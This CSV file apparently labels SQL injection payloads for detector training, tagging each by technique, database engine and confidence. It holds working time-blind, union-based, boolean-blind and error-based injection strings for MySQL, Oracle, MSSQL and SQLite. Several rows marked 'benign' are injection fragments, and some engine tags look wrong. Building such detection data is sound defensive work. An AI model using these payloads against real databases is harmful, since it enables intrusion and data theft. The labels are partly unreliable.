id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25816,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'ydxb' = 'ydxb",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25832,"1 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25858,"1' in boolean mode ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25896,"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25902,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'ozur' = 'ozur",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25815,"iif ( 1305 = 5656,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
25868,waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25893,-3597' ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 23 chars.,2
25919,( case when 5640 = 5640 then 5640 else null end ),benign,generic,0.9,Signals: 'case'. Payload length: 49 chars.,2
25920,"-1503"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
25805,"-1204' ) ) union all select 3585,3585--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
25808,"-8007' where 9649 = 9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
25810,"-2190' ) where 8890 = 8890 union all select 8890,8890#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
25817,"-9462"" ) as vzga where 4799 = 4799 or 8691 = 1048",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
25819,"1 ) ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
25821,"-4236' ) union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
25822,"1' union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
25824,"-6778 ) as xutm where 6442 = 6442 union all select 6442,6442,6442,6442,6442,6442#",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
25826,"-9209%"" ) ) ) union all select 3736,3736,3736--",union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
25834,"-8477' union all select 2517,2517,2517--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
25842,-8359 ) where 4430 = 4430 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 42 chars.,2
25847,"-1999 ) union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
25852,"-8612'+ ( select 'iqla' where 5035 = 5035 union all select 5035,5035,5035,5035,5035,5035,5035#",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
25855,1' ) ) as qovd where 8865 = 8865 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
25861,"-8347%' ) union all select 7643,7643,7643--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
25863,"-6017 union all select 8449,8449,8449--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
25864,"1"" ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
25870,1 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 17 chars.,2
25876,"-3609"" ) ) as fzyp where 9474 = 9474 or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
25877,"-6335"" ) ) ) union all select 3654--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
25880,"1"" and 4288 = 3696 and ""qqam"" like ""qqam",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
25886,"1"" ) where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,2
25887,"-2787' ) ) union all select 1996,1996,1996,1996,1996,1996,1996,1996#",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
25890,"1 ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
25892,"1"" where 2878 = 2878 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
25904,"-4550"" ) as hlwe where 6026 = 6026 or ( 9364 = 9593 ) *9593--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,2
25905,"-9408%"" ) ) union all select 1841,1841,1841,1841,1841,1841--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
25911,"-8046"" ) ) ) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
25914,"-7725%' ) ) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
25921,"1"" ) and 2006 = 2006",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
25922,1' ) ) ) and 2542 = 7042--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
25925,"-4373%"" ) ) or 5672 = 5188--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
25928,1' ) as xskm where 3525 = 3525 and 2435 = 6513,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 46 chars.,2
25934,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
25945,"1' ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
25951,-3846%' or 6872 = 6872 and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 34 chars.,2
25952,"-4929"" where 6381 = 6381 or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
25953,1' ) where 1917 = 1917 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
25954,"-9175' ) ) union all select 6174,6174,6174,6174--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
25962,1' ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
25965,"-2197' union all select 8065,8065,8065,8065--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
25968,"1%"" union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
25972,"-3827"" ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
25976,1%' ) and 7533 = 7533 and ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 35 chars.,2
25981,1 ) ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
25982,"-4586 union all select 2068,2068,2068,2068--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
25990,"1"" ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
25964,end ) +',benign,generic,0.5,. Payload length: 8 chars.,2
25835,"1"" ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25860,"1"" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""wute"" like ""wute",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25873,"1' where 2162 = 2162 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
25909,"1%' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25927,1' rlike sleep ( 5 ) and 'ojqz' like 'ojqz,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
25931,"1%"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25959,"1%"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""%"" = """,error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
25963,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25979,"1' in boolean mode ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
25987,"1%' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25998,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25801,"1%' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( '%' = '",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25807,"-7491"" ) as cnrn where 3635 = 3635 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 46 chars.,1
25888,"-5928"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""rggt"" like ""rggt",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25910,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'oucg' = 'oucg",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25958,"1' and elt ( 9371 = 8882,8882 ) and 'vurh' = 'vurh",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25977,"1' ) where 6634 = 6634 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25991,"1"" ) ) as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25999,1 where 4985 = 4985 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 31 chars.,1
25811,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'vvkd' like 'vvkd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
25831,"1%' ) and make_set ( 8403 = 8403,8899 ) and ( '%' = '",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1
25846,1 ) and ( 7557 = 1711 ) *1711 and ( 5157 = 5157,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1
25866,1' and ( 3020 = 3020 ) *6703 and 'qsrz' = 'qsrz,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1
25884,-9875' ) or ( 8459 = 8459 ) *4906 and ( 'mrxw' = 'mrxw,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
25933,end and ( 'unko' = 'unko,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,1
25935,-5116 ) or ( 8287 = 4930 ) *4930,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 32 chars.,1
25957,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'qfxg' = 'qfxg,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
25973,"1' and make_set ( 9860 = 6956,6956 ) and 'toru' = 'toru",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
25997,"end and ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,1
25802,"1"" ) where 3321 = 3321",benign,generic,0.5,. Payload length: 22 chars.,1
25806,1 ) where 4711 = 4711,benign,generic,0.5,. Payload length: 21 chars.,1
25825,"1"" where 9919 = 9919",benign,generic,0.5,. Payload length: 20 chars.,1
25828,1' ) as kqbh where 6138 = 6138,benign,generic,0.5,. Payload length: 30 chars.,1
25836,"1"" where 4319 = 4319",benign,generic,0.5,. Payload length: 20 chars.,1
25841,1' ) as mara where 7164 = 7164,benign,generic,0.5,. Payload length: 30 chars.,1
25865,1 ) ) as hxzh where 9284 = 9284,benign,generic,0.5,. Payload length: 31 chars.,1
25879,"1"" ) as fgne where 7207 = 7207",benign,generic,0.5,. Payload length: 30 chars.,1
